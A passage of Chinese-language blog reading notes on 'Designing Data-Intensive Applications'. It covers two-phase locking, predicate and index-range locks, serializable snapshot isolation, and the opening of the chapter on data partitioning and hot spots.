<p>在 2PL 中，<mark style="background: #FFF3A3A6;">写入不仅会阻塞其他写入，也会阻塞读</mark>，反之亦然。快照隔离使得 &nbsp;<strong>读不阻塞写，写也不阻塞读</strong>，这是 2PL 和快照隔离之间的关键区别。另一方面，因为 2PL 提供了可串行化的性质，它可以<mark style="background: #BBFABBA6;">防止早先讨论的所有竞争条件，包括丢失更新和写偏差</mark>。</p>
<h4 id="实现两阶段锁">实现两阶段锁</h4>
<p>2PL 用于 MySQL（InnoDB）和 SQL Server 中的可串行化隔离级别，以及 DB2 中的可重复读隔离级别。</p>
<p>读与写的阻塞是通过为数据库中每个对象添加锁来实现的。锁可以处于 &nbsp;<strong>共享模式（shared mode）</strong>&nbsp; 或 &nbsp;<strong>独占模式（exclusive mode）</strong>。锁使用如下：</p>
<ul>
<li>若事务要<mark style="background: #FFF3A3A6;">读取对象，须先以共享模式获取锁</mark>。允许多个事务同时持有共享锁。但如果另一个事务已经在对象上持有排它锁，则这些事务必须等待。</li>
<li>若事务<mark style="background: #FFF3A3A6;">要写入一个对象，必须先以独占模式获取该锁</mark>。没有其他事务可以同时持有锁（无论是共享模式还是独占模式），所以如果对象上存在任何锁，该事务必须等待。</li>
<li>如果事务先读取再写入对象，则它可能会<mark style="background: #FFF3A3A6;">将其共享锁升级为独占锁</mark>。升级锁的工作与直接获得独占锁相同。</li>
<li>事务<mark style="background: #FFF3A3A6;">获得锁之后，必须继续持有锁直到事务结束（提交或中止）</mark>。这就是 “两阶段” 这个名字的来源：
<ul>
<li>第一阶段：当事务正在执行时，获取锁</li>
<li>第二阶段：在事务结束时，释放所有的锁</li>
</ul></li>
</ul>
<p>由于使用了这么多的锁，因此很可能会发生：事务 A 等待事务 B 释放它的锁，反之亦然。这种情况叫做 &nbsp;<strong>死锁（Deadlock）</strong>。<mark style="background: #BBFABBA6;">数据库会自动检测事务之间的死锁，并中止其中一个</mark>，以便另一个继续执行。被中止的事务需要由应用程序重试。</p>
<h4 id="两阶段锁定的性能">两阶段锁定的性能</h4>
<p>两阶段锁定的巨大缺点，以及 70 年代以来没有被所有人使用的原因，是其性能问题。<mark style="background: #FF5582A6;">两阶段锁定下的事务吞吐量与查询响应时间要比弱隔离级别下要差得多</mark>。</p>
<p>这一部分是由于获取和释放所有这些锁的开销，但更重要的是由于并发性的降低。按照设计，如果两个并发事务试图做任何可能导致竞争条件的事情，那么必须等待另一个完成。</p>
<p>传统的关系数据库不限制事务的持续时间，因为它们是为等待人类输入的交互式应用而设计的。因此，当一个事务需要等待另一个事务时，等待的时长并没有限制。即使你保证所有的事务都很短，如果有多个事务想要访问同一个对象，那么可能会形成一个队列，所以事务可能需要等待几个其他事务才能完成。</p>
<p>因此，<mark style="background: #FF5582A6;">运行 2PL 的数据库可能具有相当不稳定的延迟</mark>，如果在工作负载中存在争用，那么可能<mark style="background: #FF5582A6;">高百分位点处的响应会非常的慢</mark>。可能只需要一个缓慢的事务，或者一个访问大量数据并获取许多锁的事务，就能把系统的其他部分拖慢，甚至迫使系统停机。当需要稳健的操作时，这种不稳定性是有问题的。</p>
<p>在基于 2PL 实现的可串行化隔离级别中，<mark style="background: #FFF3A3A6;">死锁会出现的频繁的多</mark>（取决于事务的访问模式）。这可能是一个额外的性能问题：当事务由于死锁而被中止并被重试时，它需要从头重做它的工作。如果死锁很频繁，这可能意味着巨大的浪费。</p>
<h4 id="谓词锁">谓词锁</h4>
<p>可串行化隔离级别的数据库必须防止<strong>幻读</strong>。</p>
<p>在会议室预订的例子中，这意味着如果一个事务在某个时间窗口内搜索了一个房间的现有预订（见例 7-2），则<mark style="background: #FFF3A3A6;">另一个事务不能同时插入或更新同一时间窗口与同一房间的另一个预订</mark> （可以同时插入其他房间的预订，或在不影响另一个预定的条件下预定同一房间的其他时间段）。</p>
<p>如何实现这一点？需要一个 &nbsp;** 谓词锁（predicate lock）。它类似于前面描述的共享 / 排它锁，但不属于特定的对象（例如，表中的一行），它<mark style="background: #FFF3A3A6;">属于所有符合某些搜索条件的对象</mark>，如：</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> bookings</span><br><span class="line"><span class="keyword">WHERE</span> room_id <span class="operator">=</span> <span class="number">123</span> <span class="keyword">AND</span></span><br><span class="line">      end_time <span class="operator">&gt;</span> <span class="string">'2018-01-01 12:00'</span> <span class="keyword">AND</span></span><br><span class="line">      start_time <span class="operator">&lt;</span> <span class="string">'2018-01-01 13:00'</span>;</span><br></pre></td></tr></tbody></table></figure>
<p>谓词锁限制访问：</p>
<ul>
<li>如果事务 A 想要读取匹配某些条件的对象，就像在这个 &nbsp;<code>SELECT</code>&nbsp; 查询中那样，它必须获取查询条件上的 &nbsp;<mark style="background: #BBFABBA6;">共享谓词锁</mark>（shared-mode predicate lock）。如果另一个事务 B 持有任何满足这一查询条件对象的排它锁，那么 A 必须等到 B 释放它的锁之后才允许进行查询。</li>
<li>如果事务 A 想要插入，更新或删除任何对象，则必须首先<mark style="background: #FFF3A3A6;">检查旧值或新值是否与任何现有的谓词锁匹配</mark>。如果事务 B 持有匹配的谓词锁，那么 A 必须等到 B 已经<mark style="background: #FFF3A3A6;">提交或中止后才能继续</mark>。</li>
</ul>
<p>这里的关键思想是，<mark style="background: #BBFABBA6;">谓词锁适用于数据库中尚不存在，但将来可能会添加的对象</mark>。如果两阶段锁定包含谓词锁，则数据库将阻止所有形式的写入偏差和其他竞争条件，因此其隔离实现了可串行化。</p>
<h4 id="索引范围锁临键锁">索引范围锁 / 临键锁</h4>
<p>不幸的是，谓词锁性能不佳：<strong>如果活跃事务持有很多锁，检查匹配的锁会非常耗时。</strong>&nbsp; 因此，大多数使用 2PL 的数据库实际上实现了索引范围锁（index-range locking，也称为 &nbsp;<strong>next-key locking</strong>），这是一个<mark style="background: #FFF3A3A6;">简化的近似版谓词锁</mark>。</p>
<p>通过将谓词匹配放大到更大的集合，来简化谓词锁，这是安全的。例如，如果你有在中午和下午 1 点之间预订 123 号房间的谓词锁，则锁定 123 号房间的所有时间段，或者锁定 12:00~13:00 时间段的所有房间（不只是 123 号房间）是一个安全的近似，因为<mark style="background: #FFF3A3A6;">任何满足原始谓词的写入也一定会满足这种更宽松的近似</mark>。</p>
<p>在房间预订数据库中，你可能会在 &nbsp;<code>room_id</code>&nbsp; 列上有一个索引，并且 / 或者在 &nbsp;<code>start_time</code>&nbsp; 和 &nbsp;<code>end_time</code>&nbsp; 上有索引（否则查询在大型数据库上的速度会非常慢）：</p>
<ul>
<li>假设你的索引位于 &nbsp;<code>room_id</code>&nbsp; 上，并且数据库使用此索引查找 123 号房间的现有预订。现在数据库可以简单地<mark style="background: #FFF3A3A6;">将共享锁附加到这个索引项上</mark>，表示事务已搜索 123 号房间用于预订。</li>
<li>或者，如果数据库使用基于时间的索引来查找现有预订，它可以<mark style="background: #FFF3A3A6;">将共享锁附加到该索引中的一系列值</mark>，表示事务已经将 12:00~13:00 时间段标记为用于预定。</li>
</ul>
<p>无论哪种方式，<mark style="background: #BBFABBA6;">搜索条件的近似都加到索引上</mark>。现在，如果另一个事务想要插入、更新或删除同一个房间和 / 或重叠时间段的预订，则它将不得不<mark style="background: #FFF3A3A6;">更新索引的相同部分</mark>。在这样做的过程中，它会遇到共享锁，将被迫等到锁被释放。</p>
<p>这种方法能够有效防止幻读和写入偏差。<mark style="background: #FFF3A3A6;">索引范围锁并不像谓词锁那样精确</mark>（它们可能会锁定更大范围的对象，而不是维持可串行化所必需的范围），但是由于<mark style="background: #BBFABBA6;">它们的开销较低，所以是一个很好的折衷</mark>。</p>
<p>如果没有可以挂载范围锁的索引，数据库可以<mark style="background: #FF5582A6;">退化到使用整个表上的共享锁</mark>。这对性能不利，因为它会阻止所有其他事务写入表格，但这是一个安全的回退位置。</p>
<h4 id="防止写丢失">防止写丢失</h4>
<p>乍一看，2PL 下可能还是会出现写丢失，两个事务用 share mode 读到了同一个对象，修改之后，先后升级锁写入，进而出现写丢失。</p>
<p>但上面的情况不会出现，原因在于：上面的两个事务在写入时，需要把锁从 shared mode 升级为 exclusive mode。而锁升级需要事务独占锁时才可完成，它们需要等待对方释放锁，进而出现死锁，被数据库中止。</p>
<p>因此，2PL 下不会出现写丢失的问题。</p>
<h3 id="可串行化快照隔离">可串行化快照隔离</h3>
<p>本章描绘了数据库中并发控制的惨淡现状：</p>
<ul>
<li>可串行化隔离：安全，但性能不好（2PL）或者伸缩性不好（串行执行）的</li>
<li>弱隔离级别：性能良好，但容易出现各种竞争条件（丢失更新，写入偏差，幻读等）</li>
</ul>
<p>串行化的隔离级别和高性能是从根本上相互矛盾的吗？</p>
<p>也许不是：一个称为 &nbsp;<strong>可串行化快照隔离（SSI, serializable snapshot isolation）</strong>&nbsp; 的算法是非常有前途的。它<mark style="background: #BBFABBA6;">提供了完整的可串行化隔离级别，但与快照隔离相比只有很小的性能损失</mark>。 SSI 是相当新的：它在 2008 年首次被描述【40】，并且是 Michael Cahill 的博士论文【51】的主题。</p>
<p>今天，SSI 既用于单节点数据库（PostgreSQL9.1 以后的可串行化隔离级别），也用于分布式数据库（FoundationDB 使用类似的算法）。由于 SSI 与其他并发控制机制相比还很年轻，还处于在实践中证明自己表现的阶段。但它有可能因为足够快而在未来成为新的默认选项。</p>
<h4 id="悲观与乐观的并发控制">悲观与乐观的并发控制</h4>
<p>两阶段锁是一种所谓的 &nbsp;<strong>悲观并发控制机制（pessimistic）</strong>&nbsp;，它是基于这样的原则：<mark style="background: #FFF3A3A6;">如果有事情可能出错，最好等到情况安全后再做任何事情</mark>。这就像互斥，用于保护多线程编程中的数据结构。</p>
<p>从某种意义上说，串行执行可以称为悲观到了极致：在事务持续期间，每个事务对整个数据库（或数据库的一个分区）具有排它锁，作为对悲观的补偿，让每笔事务执行得非常快，所以只需要短时间持有 “锁”。</p>
<p>相比之下，<strong>串行化快照隔离</strong>&nbsp; 是一种 &nbsp;<strong>乐观（optimistic）</strong>&nbsp; 的并发控制技术，这意味着，<mark style="background: #BBFABBA6;">即使存在可能的危险也不中止事务，而是继续执行，希望一切都会好起来</mark>。当事务想要提交时，数据库检查是否有什么不好的事情发生（即隔离性是否被违反）；<mark style="background: #FF5582A6;">如果是的话，事务将被中止，并且必须重试</mark>。只有可串行化的事务才被允许提交。</p>
<p>乐观并发控制是一个古老的想法，其优点和缺点已经争论了很长时间。</p>
<ul>
<li>缺点：如果存在很多<strong>争用</strong>（contention，即很多事务试图访问相同的对象），则乐观锁表现不佳，因为这会<mark style="background: #FF5582A6;">导致很大一部分事务需要中止</mark>。如果系统已经接近最大吞吐量，来自重试事务的额外负载可能会使性能变差。</li>
<li>优点：如果有足够的空闲容量，并且事务之间的争用不是太高，乐观的并发控制技术往往比悲观的<mark style="background: #BBFABBA6;">性能好</mark>。
<ul>
<li>可交换的原子操作可以减少争用，例如计数器</li>
</ul></li>
</ul>
<p>顾名思义，SSI 基于快照隔离 —— 也就是说，<mark style="background: #FFF3A3A6;">事务中的所有读取都是来自数据库的一致性快照</mark>。与早期的乐观并发控制技术相比这是主要的区别。在快照隔离的基础上，SSI 添加了一种算法来检测写入之间的串行化冲突，并确定要中止哪些事务。</p>
<h4 id="基于前提失效的决策">基于前提失效的决策</h4>
<p>快照隔离中的写入偏差遵循一个循环模式：</p>
<ol type="1">
<li>读取：事务从数据库读取一些数据</li>
<li>决策：根据查询的结果决定采取一些操作</li>
<li>写入：写入数据库</li>
<li>提交</li>
</ol>
<p>但是，在<mark style="background: #FFF3A3A6;">快照隔离的情况下，原始查询的结果在事务提交时可能不再是最新的</mark>，因为数据可能在同一时间被修改。</p>
<p>换句话说，事务基于一个 &nbsp;<strong>前提（premise）</strong>&nbsp; 采取行动（事务开始时候的事实，例如：“目前有两名医生正在值班”）。之后<mark style="background: #FFF3A3A6;">当事务要提交时，原始数据可能已经改变 —— 前提可能不再成立</mark>。</p>
<p>总结来说，<mark style="background: #BBFABBA6;">事务中的查询与写入可能存在因果依赖</mark>。为了提供可串行化的隔离级别，如果事务在过时的前提下执行操作，数据库必须能检测到这种情况，并中止事务。</p>
<p>数据库如何知道查询结果是否可能已经改变？有两种情况需要考虑：</p>
<ul>
<li>读取时：读到了旧 MVCC 对象版本的读取（存在更新，但未提交的写入）</li>
<li>写入时：可能影响先前的读取（读之后发生写入）</li>
</ul>
<h4 id="检测旧-mvcc-读取">检测旧 MVCC 读取</h4>
<p>当一个事务从 MVCC 数据库中的一致快照读时，它将<mark style="background: #FFF3A3A6;">忽略取快照时尚未提交的任何其他事务所做的写入</mark>。在图 7-10 中，事务 43 认为 Alice 的 &nbsp;<code>on_call = true</code>&nbsp;，因为事务 42（修改 Alice 的待命状态）未被提交。然而，在事务 43 想要提交时，事务 42 已经提交。这意味着<mark style="background: #FF5582A6;">在读一致性快照时被忽略的写入已经生效，事务 43 的前提不再为真</mark>。</p>
<p><img src="ch07-fig10.png"></p>
<p><strong>图 7-10 检测事务何时从 MVCC 快照读取过时的值</strong></p>
<p>为了防止这种异常，数据库需要<mark style="background: #BBFABBA6;">跟踪一个事务由于 MVCC 可见性规则而忽略另一个事务的写入</mark>。当<mark style="background: #FFF3A3A6;">事务想要提交时，数据库检查是否有任何被忽略的写入现在已经被提交</mark>。如果是这样，事务必须中止。</p>
<p>延迟到提交时检测，而不是发现过时读取立即中止，是为了避免不必要的中止：</p>
<ul>
<li>数据库并不知道事务之后是否会发生基于这些读取的写入操作，有可能是只读查询</li>
<li>如果事务 42 可能在事务 43 被提交的时候中止或者可能仍然未被提交，因此<mark style="background: #FFF3A3A6;">读取可能不是陈旧的</mark>。</li>
</ul>
<p>SSI 保留了快照隔离从一致快照中长时间读取的能力</p>
<h4 id="检测影响之前读取的写入">检测影响之前读取的写入</h4>
<p>第二种情况要考虑的是另一个事务在读取数据之后修改数据。这种情况如图 7-11 所示。</p>
<p><img src="ch07-fig11.png"></p>
<p><strong>图 7-11 在可串行化快照隔离中，检测一个事务何时修改另一个事务的读取。</strong></p>
<p>在两阶段锁中，我们讨论了索引范围锁，它允许数据库锁定与某个搜索查询匹配的所有行的访问权，例如 &nbsp;<code>WHERE shift_id = 1234</code>。可以在这里使用类似的技术，除了<mark style="background: #BBFABBA6;"> SSI 锁不会阻塞其他事务</mark>。</p>
<p>在图 7-11 中，事务 42 和 43 都在班次 1234 查找值班医生。如果在 &nbsp;<code>shift_id</code>&nbsp; 上有索引，则数据库可以<mark style="background: #BBFABBA6;">使用索引</mark>项 1234 来<mark style="background: #BBFABBA6;">记录事务</mark> 42 和 43 <mark style="background: #BBFABBA6;">读取这个数据</mark>的事实。（如果没有索引，这个信息可以在表级别进行跟踪）。这个信息只需要保留一段时间：在一个事务完成（提交或中止），并且所有的并发事务完成之后，数据库就可以忘记它读取的数据了。</p>
<p>当事务<mark style="background: #FFF3A3A6;">写入数据库时，它必须在索引中查找最近曾读取受影响数据的其他事务</mark>。这个过程类似于在受影响的键范围上获取写锁，但这并不会阻塞当前事务，而是像警戒线一样只是简单<mark style="background: #FFF3A3A6;">通知其他事务：你们读过的数据可能不是最新的啦</mark>。</p>
<p>在图 7-11 中，事务 43 通知事务 42 其先前读已过时，反之亦然。事务 42 首先提交并成功，<mark style="background: #BBFABBA6;">尽管事务 43 的写影响了 42 ，但因为事务 43 尚未提交，所以写入尚未生效</mark>。然而当事务 43 想要提交时，来自事务 42 的冲突写入已经被提交，所以事务 43 必须中止。</p>
<h4 id="可串行化快照隔离的性能">可串行化快照隔离的性能</h4>
<p>许多工程细节会影响算法的实际表现。例如一个权衡是跟踪事务的读取和写入的<strong>粒度（granularity）</strong>：</p>
<ul>
<li>细粒度：数据库详细地跟踪每个事务的活动，那么可以准确地确定哪些事务需要中止，但是会有显著的记录开销</li>
<li>粗粒度：记录开销低，但可能会导致更多不必要的事务中止。</li>
</ul>
<p>在某些情况下，事务可以读取被另一个事务覆盖的信息：这取决于发生了什么，有时可以证明执行结果无论如何都是可串行化的。 PostgreSQL 使用这个理论来减少不必要的中止次数。</p>
<p>与两阶段锁定相比，可串行化快照隔离的最大优点是<mark style="background: #BBFABBA6;">一个事务不需要阻塞等待另一个事务所持有的锁</mark>。就像在快照隔离下一样，写不会阻塞读，反之亦然。这种设计原则使得查询延迟更可预测，波动更少。特别是，只读查询可以运行在一致快照上，而不需要任何锁定，这对于读取繁重的工作负载非常有吸引力。</p>
<p>与串行执行相比，<mark style="background: #BBFABBA6;">可串行化快照隔离并不局限于单个 CPU 核的吞吐量</mark>：FoundationDB 将串行化冲突的检测分布在多台机器上，允许扩展到很高的吞吐量。即使数据可能跨多台机器进行分区，事务也可以在保证可串行化隔离等级的同时读写多个分区中的数据【54】。</p>
<p>中止率显著影响 SSI 的整体表现。例如，长时间读取和写入数据的事务很可能会发生冲突并中止，因此 SSI 要求<mark style="background: #FFF3A3A6;">同时读写的事务尽量短</mark>（只读的长事务可能没问题）。对于慢事务，相较于两阶段锁定或串行执行，SSI 可能更不敏感。</p>
<h2 id="总结">总结</h2>
<p>事务是一个抽象层，允许应用程序<mark style="background: #BBFABBA6;">假装某些并发问题和某些类型的硬件和软件故障不存在</mark>。各式各样的错误被简化为一种简单情况：<strong>事务中止（transaction abort）</strong>，而应用需要的仅仅是重试。</p>
<p>在本章中介绍了很多问题，事务有助于防止这些问题发生。并非所有应用都易受此类问题影响：具有非常简单访问模式的应用（例如每次读写单条记录）可能无需事务。但是对于更复杂的访问模式，<mark style="background: #BBFABBA6;">事务可以大大减少需要考虑的潜在错误情景数量</mark>。</p>
<p>如果没有事务处理，各种错误情况（进程崩溃，网络中断，停电，磁盘已满，意外并发等）意味着数据可能以各种方式变得不一致。例如，非规范化的数据可能很容易与源数据不同步。如果没有事务处理，就很难推断复杂的交互访问可能对数据库造成的影响。</p>
<p>本章深入讨论了 &nbsp;<strong>并发控制</strong>&nbsp; 的话题。我们讨论了几个广泛使用的隔离级别，特别是 &nbsp;<strong>读已提交</strong>、<strong>快照隔离</strong>（有时称为可重复读）和 &nbsp;<strong>可串行化</strong>。并通过研究竞争条件的各种例子，来描述这些隔离等级：</p>
<table>
<colgroup>
<col style="width: 7%">
<col style="width: 51%">
<col style="width: 41%">
</colgroup>
<thead>
<tr class="header">
<th>问题</th>
<th>描述</th>
<th>解决</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>脏读</td>
<td>读取到另一客户端尚未提交的写入</td>
<td>保存已提交和最新版本的对象，<strong>读已提交</strong>&nbsp; 或更强的隔离级别可以防止脏读</td>
</tr>
<tr class="even">
<td>脏写</td>
<td>覆盖另一客户端尚未提交的写入</td>
<td>加锁，几乎所有的事务实现都可以防止脏写</td>
</tr>
<tr class="odd">
<td>读取偏差 (不可重复读)</td>
<td> 同一事务中，客户端在不同的时间点会看见数据库的不同状态</td>
<td><strong>快照隔离，允许事务从一个特定时间点的一致性快照中读取数据。快照隔离通常使用 &nbsp;</strong>多版本并发控制（MVCC）**&nbsp; 来实现</td>
</tr>
<tr class="even">
<td>丢失更新</td>
<td>两个客户端同时执行 &nbsp;<strong>读取 - 修改 - 写入序列</strong>。其中一个写操作，在没有合并另一个写入变更情况下，直接覆盖了另一个写操作的结果。所以导致数据丢失。</td>
<td>快照隔离的一些实现可以自动防止这种异常，而另一些实现则需要手动锁定（<code>SELECT FOR UPDATE</code>）</td>
</tr>
<tr class="odd">
<td>写偏差</td>
<td>事务读取一些东西，根据它所看到的值作出决定，并将该决定写入数据库。但是，写入时，该决定的前提不再成立。</td>
<td>只有可串行化的隔离才能防止这种异常</td>
</tr>
<tr class="even">
<td>幻读</td>
<td>事务读取符合某些搜索条件的对象。另一个客户端进行写入，影响搜索结果</td>
<td>快照隔离可以防止直接的幻读，但是写入偏差上下文中的幻读需要特殊处理，例如索引范围锁定</td>
</tr>
</tbody>
</table>
<p>弱隔离级别可以防止其中一些异常情况，但要求应用程序手动处理剩余那些（例如，使用显式锁定）。只有可串行化的隔离才能防范所有这些问题。本章讨论了实现可串行化事务的三种不同方法：</p>
<ul>
<li>字面意义上的串行执行 如果每个事务的执行速度非常快，并且事务吞吐量足够低，足以在单个 CPU 核上处理，这是一个简单而有效的选择。</li>
<li>两阶段锁定 数十年来，两阶段锁定一直是实现可串行化的标准方式，但是许多应用出于性能问题的考虑避免使用它。</li>
<li>可串行化快照隔离（SSI） 一个相当新的算法，避免了先前方法的大部分缺点。它使用乐观的方法，允许事务执行而无需阻塞。当一个事务想要提交时，它会进行检查，如果执行不可串行化，事务就会被中止。</li>
</ul>
<p>本章中的示例主要是在关系数据模型的上下文中。但是，正如在多对象事务的需求中所讨论的，<mark style="background: #BBFABBA6;">无论使用哪种数据模型，事务都是有价值的数据库功能</mark>。</p>
<p>本章主要是在单机数据库的上下文中，探讨了各种想法和算法。<mark style="background: #FFF3A3A6;">分布式数据库中的事务，引入了一系列新的困难挑战</mark>，将在接下来的两章中讨论。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://ddia.qtmuniao.com/#/ch07">第七章：事务 (qtmuniao.com)</a></li>
<li><a href="http://ddia.vonng.com/#/ch7">第七章：事务 (vonng.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
        <category>后端</category>
        <category>DDIA</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>设计数据密集型应用</tag>
        <tag>事务</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA 阅读笔记第六章：分片</title>
    <url>/blog/2024/05/11/DDIA-Note-6/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>第六章讨论了分片这一技术，通过将数据将大数据集拆分为多个小数据集，存储在多个节点上，来达到提高吞吐的效果。</p>
<span id="more"></span>
<h3 id="什么是分片">什么是分片</h3>
<ol type="1">
<li><strong>分片（Partition），也叫分片（sharding）</strong>：将大数据集拆分为多个小数据集（分片），存储在不共享集群的多个节点上，利用多机处理负载，提高吞吐、可扩展性。
<ol type="1">
<li>对于在单个分片上运行的查询，每个节点可以独立执行对自己的查询，因此可以通过添加更多的节点来扩大查询吞吐量。</li>
<li>复杂的查询可能会跨越多个节点并行处理，这也带来了新的困难。</li>
</ol></li>
<li><strong>复制（Replication</strong>）：同一份数据使用多机存储多副本，避免单点故障、提高可扩展性和可用性。</li>
</ol>
<p>二者的区别：巨大数据集无法存储在单机上，复制技术就无效了，必须先分片。</p>
<blockquote>
<p>术语澄清 上文中的分片 (partition) 是约定俗成的叫法，但还有其他叫法：</p>
<ul>
<li>在 MongoDB,Elasticsearch 和 Solr Cloud 中被称为分片 (shard)，</li>
<li>在 HBase 中称之为 ** 区域 (Region)</li>
<li>Bigtable 中则是 表块（tablet）</li>
<li>Cassandra 和 Riak 中是 ** 虚节点（vnode)</li>
<li>Couchbase 中叫做虚桶 (vBucket)</li>
</ul>
</blockquote>
<blockquote>
<p>这里的 partiton 有时也被译为分片，但这容易与网络分片（[Network partition]）混淆，因此个人建议用分片这个名字。</p>
</blockquote>
<p>通常情况下：</p>
<ul>
<li>每条记录属于且仅属于一个分片</li>
<li>每个分片都是自己的小型数据库，尽管数据库可能支持同时进行多个分片的操作。</li>
</ul>
<p>分片主要是为了<strong>可扩展性</strong>。不同的分片可以放在中的不同节点上。因此，大数据集可以分布在多个磁盘上，并且查询负载可以分布在多个处理器上。</p>
<p>在本章中，讨论：</p>
<ul>
<li>大型数据集切分的不同方法，并观察索引如何与分片配合</li>
<li>分片重平衡（Rebalancing）：如果想要添加或删除群集中的节点，则必须进行重平衡</li>
<li>请求路由：数据库如何将请求路由到正确的分片并执行查询</li>
</ul>
<h3 id="分片与复制结合"><strong>分片与复制结合</strong></h3>
<p>分片通常与复制结合使用，使得每个分片的副本存储在多个节点上。 这意味着，即使每条记录属于一个分片，它仍然可以存储在多个不同的节点上以获得容错能力。</p>
<p>一个节点可能存储多个分片。 如果使用主从复制模型，则分片和复制的组合如图 6-1 所示。</p>
<ul>
<li>每个分片中：存在一个节点为主副本，其他节点为从副本。</li>
<li>每个节点中：既有主副本分片，又有从副本分片。</li>
</ul>
<p>数据库复制的所有内容同样适用于分片的复制。 大多数情况下，分片方案的选择与复制方案的选择是独立的，为简单起见，本章中将忽略复制。</p>
<p><img src="fig6-1.png"></p>
<p>图 6-1 组合使用复制和分片：每个节点充当某些分片的<strong>主副本</strong>，其他分片充当<strong>从副本</strong></p>
<h2 id="key-value-数据的分片">key-value 数据的分片</h2>
<p>分片目标是将数据和查询负载均匀分布在各个节点上，成倍提高吞吐：</p>
<ul>
<li>如果每个节点公平分享数据和负载，那么理论上 10 个节点应该能够处理 10 倍的数据量和 10 倍的单个节点的读写吞吐量（暂时忽略复制）。</li>
</ul>
<p>如果分片是不公平的，一些分片比其他分片有更多的数据或查询，称之为<strong><mark style="background: #FFF3A3A6;">偏斜（skew）</mark></strong>。</p>
<ul>
<li>数据偏斜会降低分片效率。在极端的情况下，所有的负载可能压在一个分片上，其余 9 个节点空闲的，瓶颈落在这一个繁忙的节点上。</li>
<li>不均衡导致的高负载的分片被称为<strong>热点（hot spot）</strong>。</li>
</ul>
<h3 id="根据键范围分片">根据键范围分片</h3>
<p>将键的范围（从最小值到最大值）拆成多个区间，每个区间对应一个分片。</p>
<ul>
<li>可以很快确定 key 在哪个分片上（查找包含它的区间）</li>
<li>如果还知道分片所在的节点，那么可以直接向相应的节点发出请求</li>
</ul>
<p>为了使分片数据均匀分布，需要按照数据的分布，动态调整分片的边界（对键范围等分通常不能使分片数据均匀）</p>
<ul>
<li>可以由管理员手动完成</li>
<li>也可以自动进行，参见重平衡</li>
</ul>
<p>在分片内部，键可以按序存储，这使得可以支持<strong>高效的范围查询（Rang Query）</strong>。例如某个应用是保存传感器数据，并将时间戳作为键进行分片，则可轻松获取一段时间内（起始到终止区间内）的数据。</p>
<p>但坏处在于，数据访问模式容易造成热点。例如某段范围的数据读写频率远高于其他数据。</p>
<ul>
<li>仍以传感器数据存储为例，以时间戳为 Key，按天的粒度进行分片，所有最新写入都被路由到最后一个分片节点，造成严重的写入倾斜，不能充分利用所有机器的写入带宽。</li>
<li>解决办法：根据访问模式，使用拼接主键<strong>将热点读写打散到多节点</strong>。例如使用传感器名称 + 时间戳作为主键，则可以将同时写入的多个传感器的数据分散到多机上去。</li>
</ul>
<h3 id="根据-hash-分片">根据 hash 分片</h3>
<p>为了避免数据倾斜和读写热点，许多数据系统使用散列函数对键进行分片。</p>
<p>好的散列函数：</p>
<ul>
<li>应该将偏斜的数据均匀分布：对于一个新的字符串输入，它将返回一个 <code>[0, 2^32-1)</code> 中的 “随机数”。 即使输入的字符串非常相似，它们的散列也会均匀分布在这个数字范围内。</li>
<li>不需要具有健壮的加密算法。但编程语言内置的简单哈希函数（它们用于散列表）可能不适合分片：例如，在 Java 的 <code>Object.hashCode()</code> 和 Ruby 的 <code>Object#hash</code>，同一个键可能在不同的进程中有不同的哈希值。 <img src="fig6-3.png"> <strong>图 6-3 按哈希键分片</strong></li>
</ul>
<p>hash 分片：</p>
<ul>
<li>优点：好的 hash 函数能够均匀地将负载分摊到各节点，不会出现热点</li>
<li>缺点：范围查询低效，需要发送到所有节点；对比之下，根据键范围的分片只需要发送到与范围相关的节点</li>
</ul>
<p>Cassandra 使用了<mark style="background: #FFF3A3A6;">组合主键（compound primary key）</mark>来达到折中：</p>
<ul>
<li>只有组合主键的第一列决定分片，剩下的列作为多列索引用于将分片数据在 SSTable 中排序</li>
<li>单个 query 虽然不能高效地在主键第一列上执行范围查询，但是可以在固定第一列的情况下，对剩下的列执行高效的范围查询。这种多列索引很适合一对多关系。
<ul>
<li>例如，想要查询同一个用户的发帖历史，可以按 user_id 作为主键第一列，发帖时间作为第二列，就可以高效地执行范围查询。不同用户的数据存储在不同节点上，但同一用户的数据只会按发帖时间顺序存放在单一节点。</li>
<li>这种<mark style="background: #FFF3A3A6;">相关数据局部化</mark>的思想，Redis 也有用到，参考 <a href="https://redis.io/blog/redis-clustering-best-practices-with-keys/">Redis Clustering Best Practices With Multiple Keys - Redis</a>。Redis Hashtag 特性支持用大括号把 key 的一部分包起来，只使用这一部分计算 hash，决定分片，类似上面例子的主键第一列，这使得可以把相关的数据存储在同一个节点上，提高读写效率。</li>
</ul></li>
</ul>
<h3 id="负载偏斜和热点消除"><strong>负载偏斜和热点消除</strong></h3>
<p>如前所述，哈希分片可以帮助减少热点。但是，它不能完全避免它们：在极端情况下，<strong>所有的读写操作都是针对同一个键的，所有的请求都会被路由到同一个分片</strong>。</p>
<p>这种场景也许并不常见，但并非闻所未闻：例如，在社交媒体网站上，一个拥有数百万追随者的名人用户在做某事时可能会引发一场风暴【14】。这个事件可能导致同一个键的大量写入（键可能是名人的用户 ID，或者人们正在评论的动作的 ID）。哈希策略不起作用，因为两个相同 ID 的哈希值仍然是相同的。</p>
<p>如今，大多数数据系统无法自动补偿这种高度偏斜的负载，因此应用程序有责任减少偏斜。例如，如果一个主键被认为是非常火爆的，一个简单的方法是在主键的开始或结尾添加一个随机数。只要一个两位数的十进制随机数就可以将主键分散为 100 种不同的主键，从而存储在不同的分片中。</p>
<p>然而，将主键进行分割之后，任何读取都必须要做额外的工作，因为他们必须从所有 100 个主键分布中读取数据并将其合并。此技术还需要额外的记录：只需要对少量热点附加随机数；对于写入吞吐量低的绝大多数主键来说是不必要的开销。因此，你还需要一些方法来跟踪哪些键需要被分割。</p>
<p>也许在将来，数据系统将能够自动检测和补偿偏斜的工作负载；但现在，你需要自己来权衡。</p>
<h2 id="分片与二级索引"><strong>分片与二级索引</strong></h2>
<p>key-value 数据下，使用主键（即 key）分片，在已知 key 时可以唯一确定分片，将读写请求路由到负责该键的分片。</p>
<ul>
<li>各种唯一 id：user_id，item_id 都是这种场景</li>
</ul>
